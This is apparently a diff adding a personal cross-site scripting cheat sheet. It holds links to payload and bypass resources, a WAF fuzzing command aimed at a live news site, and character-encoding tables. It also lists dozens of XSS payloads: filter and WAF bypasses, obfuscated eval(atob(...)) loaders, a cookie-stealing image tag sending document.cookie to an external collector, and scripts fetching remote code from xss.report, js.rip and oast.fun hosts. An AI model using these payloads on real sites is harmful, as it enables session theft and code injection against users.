@@ -1,0 +1,244 @@
+https://me6.com/aem/xss2.svg => svg file
+https://www.youtube.com/watch?v=Rz44oTCxULs&ab_channel=BePractical
+https://xsshunter.trufflesecurity.com/app/#/xsspayloads
+https://dencode.com/
+https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#xss-uploading-files-svg
+https://d3adend.org/xss/ghettoBypass
+https://xss.report/dashboard
+https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet
+https://xssor.io/#codz
+https://cors.l0.cm/ -> xss domain
+https://nj.rs/ => payloads
+http://brutelogic.com.br/poc.svg
+https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
+https://github.com/sysdig/wafer => best tool for fuzzing xss 
+https://github.com/waf-bypass-maker/waf-community-bypasses/blob/main/payloads.twitter.csv
+https://shazzer.co.uk/ => xss all bypasses [informative] 
+---------------------------------------------------------XSS-----------------------------------------------------------
+I can bypass giving comments /* */
+
+python3 wafer.py --url "https://www.bild.de/?gtrans=%22%27%3E" --param gtrans 
+PS C:\Users\USER\tools> python3 encoder.py -u '<mmnahianTest>' -e '<>'
+ 
+  '<': ['&lt;', '%26lt;', '%26%2360;', '%26%23x3C;', '&#60;', '&#x3C;', '%3C', '%C0%BC', '%E0%80%BC', '%F0%80%80%BC', '%2F%2Fu003C'],
+        '>': ['&gt;', '%26gt;', '%26%2362;', '%26%23x3E;', '&#62;', '&#x3E;', '%3E', '%C0%BE', '%E0%80%BE', '%F0%80%80%BE', '%2F%2Fu003E'],
+        "'": ['&apos;', '%26%239;', '%26%23x27;', '%27', '%C0%A7', '%E0%80%A7', '%F0%80%80%A7', '%2F%2Fu0027'],
+        '"': ['&quot;', '%26%2334;', '%26%23x22;', '%22', '%C0%A2', '%E0%80%A2', '%F0%80%80%A2', '%26%2334%3B', '%2F%2Fu0022'],
+        '&': ['&amp;', '%26amp;', '%26%2338;', '%26%23x26;', '%2F%2Fu0026'],
+        '/': ['&sol;', '%26sol;', '%26%2347;', '%26%23x2F;','%2F%2Fu002F'],
+        '=': ['&#61;', '%26%2361;', '%26%2361;', '%26%23x3D;', '%3D', '%2F%2Fu003D'],
+        '(': ['%26%2340;', '%26%2340;', '%26%23x28;', '%28', '%2F%2Fu0028'],
+        ')': ['%26%2341;', '%26%2341;', '%26%23x29;', '%29', '%2F%2Fu0029']
+
+<	%26lt; 	%26%2360; 	%26%23x3C;		&lt;	&#60;  &#x3C;	%3C, %C0%BC, %E0%80%BC, %F0%80%80%BC	\u003C
+>	%26gt; %26%2362; 	%26%23x3E;  &gt;	&#62;	&#x3E;	%3E, %C0%BE, %E0%80%BE, %F0%80%80%BE	\u003E
+'	&apos;	%26%239;	%26%23x27;	%27, %C0%A7, %E0%80%A7, %F0%80%80%A7	\u0027
+"	&quot;	%26%2334;	%26%23x22;	%22, %C0%A2, %E0%80%A2, %F0%80%80%A2, %26%2334%3B	\u0022  
+&	%26amp;	%26%2338;	%26%23x26;		\u0026
+/	%26sol;	%26%2347;	%26%23x2F;	%2F	\u002F
+=	%26#61;	%26%2361;	%26%23x3D;	%3D	\u003D
+(	%26%2340;	%26%2340;	%26%23x28;	%28	\u0028
+)	%26%2341;	%26%2341;	%26%23x29;	%29	\u0029
+mmnahiantest"
+mmnahiantest%22
+mmnahiantest%C0%A2
+mmnahiantest%E0%80%A2
+mmnahiantest%F0%80%80%A2
+mmnahiantest%26%2334%3B
+mmnahiantest\u0022
+
+javascript:setInterval`alert\x28document.domain\x29`
+javascript:setTimeout`alert\x28document.domain\x29`
+
+Alert Obfuscation
+Use to trick several regular expression (regex) filters. It might be combined with previous
+alternatives (above). The shortest option “top” can also be replaced by “window”, “parent”,
+“self” or “this” depending on context.
+(alert)(1)
+a=alert,a(1)
+[1].find(alert)
+top["al"+"ert"](1)
+top[/al/.source+/ert/.source](1)
+al\u0065rt(1)
+top['al\145rt'](1)
+top[8680439..toString(30)](1)
+
+˂nahian˃, ‹nahian›, ≤nahian≥, ＜nahian＞
+<script>document.write(`<img src=https://xss.report/c/mmnahian/$(document.cookie)>`)</script>
+<input value="", onpointerrawupdate="a=confirm, a(1)">
+
+<a href="javascript:(import(/https:\xss.report\c\mmnahian/.source))">aaaaaaaaaaa</a>
+
+javascript:(import(/https:\xss.report\c\mmnahian/.source))
+
+%26lt;svg/o%26%2378;load=alert(1)%26gt;
+
+<Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBCeXBhc3NlZCA6KQ=="))>
+
+type=hidden oncontentvisibilityautostatechange=confirm(/Bypassed/) style=content-visibility:auto
+
+?><img src=1 onmouseleave=print()>	
+
+data:application/x-httpd-php;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk
+data:application/vnd.wap.xhtml+xml;base64,PHg6c2NyaXB0IHhtbG5zOng9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGh0bWwiPmFsZXJ0KCdYU1MnKTwveDpzY3JpcHQ+
+
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAwIiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlhTUyIpOzwvc2NyaXB0Pjwvc3ZnPg==
+
+data:text/javascript;base64,Y29uc29sZS5sb2coJy0tU1VDQ0VTU1tdLS0nKQ==
+
+data:application/x-xpinstall;base64,Y29uc29sZS5sb2coJy0tU1VDQ0VTU1tdLS0nKQ==
+
+
+<details x=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx:2 open ontoggle="prompt(document.cookie);">
+
+"><input type="hidden" oncontentvisibilityautostatechange="confirm(/Bypassed/)" style="content-visibility:auto">
+
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL21tbmFoaWFuIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw%09onerror=eval(atob(this.id))>
+
+// atob is a built-in JavaScript function that decodes a string of data that has been encoded using Base64 encoding.
+
+
+<script>import(/\/\/0-a.nl/)</script>
+
+insights/consumer-trends/trending-visual-Stories/story'><xmp><p title="</xmp><svg/onload=prompt(document.domain)>/retail-report-trends-insights?=
+"/lib/css/animated.min'"/><script%20>alert(document.domain)<%2fscript>.css"
+<iframe+src%3D"//js.rip/3lekm4edti"><%2Fiframe>
+
+xss<script/src="https://www&#x2e;google&#x2e;com/complete/search?client=chrome&q=hello&callback=alert#1"> "></script>
+<Scri%7Kt>%7Krompt%6K1%6K</Scri%7Kt>
+
+src="https%3A%2F%2Fwww%26%23x2e%3Bgoogle%26%23x2e%3Bcom%2Fcomplete%2Fsearch%3Fclient%3Dchrome%26q%3Dhello%26callback%3Dalert%231"
+
+//www.google.com/complete/search?client=chrome&q=hello&callback=alert#1
+
+></tiTle></stYle></texTarea></scrIpt>"//'//><script src=https://xss.report/c/mmnahian></script>
+
+<sVg%09onload%3D"location%3D%60javas%60%2B%60cript%3Aale%60%2B%60rt%252%60%2B%6081%252%60%2B%609%60">
+
+PFN2ZyBPbmx5PTEgT25Mb2FkPWNvbmZpcm0oYXRvYigiUTJ4dmRXUm1iR0Z5WlNCQ2VYQmhjM05sWkNBNktRPT0iKSk+
+
+<script>eval(atob("YWxlcnQoZG9jdW1lbnQuZG9tYWluKTs"))</script>
+
+<script>fetch("admin_portal.php")</script>
+
+<script>console.log(document.domain)</script>
+
+<style>@import '//nj.rs'; </style>
+
+<script>\u0061\u006c\u0065\u0072\u0074(origin);</script>
+
+<script>al\u{65}rt(document.domain);</script>
+
+<script>top['\u{61}lert'](document.domain)</script>
+
+https://github.com/daffainfo/AllAboutBugBounty/blob/master/Cross%20Site%20Scripting.md
+
+<img/src=x onError="`${x}`;alert(`Hello`);">
+
+"><img/src=x onerror="𐂃='',𐃨=!𐂃+𐂃,𐂝=!𐃨+𐂃,𐃌=𐂃+{},𐁉=𐃨[𐂃++],𐃵=𐃨[𐂓=𐂃],𐀜=++𐂓+𐂃,𐂠=𐃌[𐂓+𐀜],𐃨[𐂠+=𐃌[𐂃]+(𐃨.𐂝+𐃌)[𐂃]+𐂝[𐀜]+𐁉+𐃵+𐃨[𐂓]+𐂠+𐁉+𐃌[𐂃]+𐃵][𐂠](𐂝[𐂃]+𐂝[𐂓]+𐃨[𐀜]+𐃵+𐁉+'(document.domain)')()"
+
+%3CSVG/oNlY=1%20ONlOAD=confirm(document.domain)%3E
+
+<svg/onload=eval(String.fromCharCode(99,111,110,102,105,114,109,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))>
+
+https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting#xss-uploading-files-svg
+
+JavaScript://%250Aalert?.(1)//
+'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!-->
+</Title/</Style/</Script/</textArea/</iFrame/</noScript>
+\74k<K/contentEditable/autoFocus/OnFocus=
+/*${/*/;{/**/(prompt)(1)}//><Base/Href=//js.rip/3lekm4edti\76-->
+
+<Base/Href="https://xss.report/c/mmnahian">
+
+JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(import(/https:\\http://kozwkwzzfgrqbrcetvgvk9ugey56g5yhc.oast.fun))}//\76-->
+
+<Img+Src=javascript:prompt(1)+OnError=location=src>
+
+'/*\'/*"/*\"/*</Script><Input/AutoFocus/OnFocus=/**/(prompt())//>
+
+"><script src="https://js.rip/3lekm4edti"></script>
+
+javascript:eval('var a=document.createElement(\'script\');a.src=\'https://js.rip/3lekm4edti\';document.body.appendChild(a)')
+
+
+"><img%20src=x%20id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwLzNsZWttNGVkdGkiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7%20onerror=eval(atob(this.id))>
+
+"><video><source%20onerror=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vanMucmlwLzNsZWttNGVkdGkiO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7>
+">
+
+<iframe%20srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;js.rip/3lekm4edti&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
+
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "https://js.rip/3lekm4edti");a.send();</script>
+
+<script>$.getScript("https://js.rip/3lekm4edti")</script>
+
+<A %252F=""Href= JavaScript:k='a',top[k%2B'lert'](1)>
+
+javascript:var{a:onerror}={a:alert};throw%20document.domain
+
+<!–>//%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*</Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/**/;{(prompt)(1)}//><Base/Href=//X55.is\76–>
+
+<!–>//%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*
+%0D%0AContent-Type:text/html%0D%0A%0D%0A
+</Title/</Style/</Script/</textArea/</iFrame/</noScript>
+\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(prompt)(1)}//><Base/Href=//kydszzdyujdrhldazoqi8v8qz4i481aor.oast.fun\76–>
+
+<animate attributeName="onbegin" values="javascript:alert('xss')" />
+<AnimateDontdeleteallmyemails data="data:text/html,<script>alert(1)</script>"></AnimateDontdeleteallmyemails>
+<marquee/onstart="alert(1)">
+<marquee%20autoload%20onmouseover="alert(1)">
+<marquee%20autoload%20onmouseover="window.print()">
+<marquee autoload onmouseover=window.open(/\/\/kydszzdyujdrhldazoqi8v8qz4i481aor.oast.fun/)>
+<marquee autoload onmouseover="document.write('XSS')">
+
+<Iframe SrcDoc="<Script Src=//kydszzdyujdrhldazoqi8v8qz4i481aor.oast.fun></Script>">
+[encode payload to base64 ]
+amF2YXNjcmlwdDphbGVydCgiWHNzIGJ5IHZpa2FzIik=
+
+<JavaScript:"\74Svg\57OnLoad\75\141\154\145\162\164\501\51\76"/ContentEditable/AutoFocus/OnFocus=location=tagName>
+
+“oncut=”alert()
+javascript:k='a',top[k+'lert'](1)
+
+<Svg%20OnLoad=location=textContent>JavaScrip<k>t:aler<k>t(<k>1)//
+
+"><details ==%2500%0d%0a%00 OnToggle=confirm(origin) open />
+'Src="//X55.is/>?<Script/K='
+
+{{$on.constructor('\\u\u007b61}lert`1`')()}}
+
+//HTML entities
+&apos;-alert(1)-&apos;
+//HTML hex without zeros
+&#x27-alert(1)-&#x27
+//HTML hex with zeros
+&#x00027-alert(1)-&#x00027
+//HTML dec without zeros
+&#39-alert(1)-&#39
+//HTML dec with zeros
+&#00039-alert(1)-&#00039
+
+javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.cookie
+
+<a href="javascript:var a='&apos;-alert(1)-&apos;'">a</a>
+<a href="&#106;avascript:alert(2)">a</a>
+<a href="jav&#x61script:alert(3)">a</a>
+<a href="https://example.com/lol%22onmouseover=%22prompt(1);%20img.png">Click</a>
+<img src onerror=\u0061\u006C\u0065\u0072\u0074(1) />
+<img src onerror=\u{61}\u{6C}\u{65}\u{72}\u{74}(1) />
+<a href="javascript:var a='&apos;-alert(1)-&apos;'">
+
+<iframe/onload=src=top.name> => will take to load time
+
+ 𒀀='',𒉺=!𒀀+𒀀,𒀃=!𒉺+𒀀,𒇺=𒀀+{},𒌐=𒉺[𒀀++], 𒀟=𒉺[𒈫=𒀀],𒀆=++𒈫+𒀀,𒁹=𒇺[𒈫+𒀆],𒉺[𒁹+=𒇺[𒀀] +(𒉺.𒀃+𒇺)[𒀀]+𒀃[𒀆]+𒌐+𒀟+𒉺[𒈫]+𒁹+𒌐+𒇺[𒀀] +𒀟][𒁹](𒀃[𒀀]+𒀃[𒈫]+𒉺[𒀆]+𒀟+𒌐+"(𒀀)")()
+
+
+
+
+
+
+
+
+
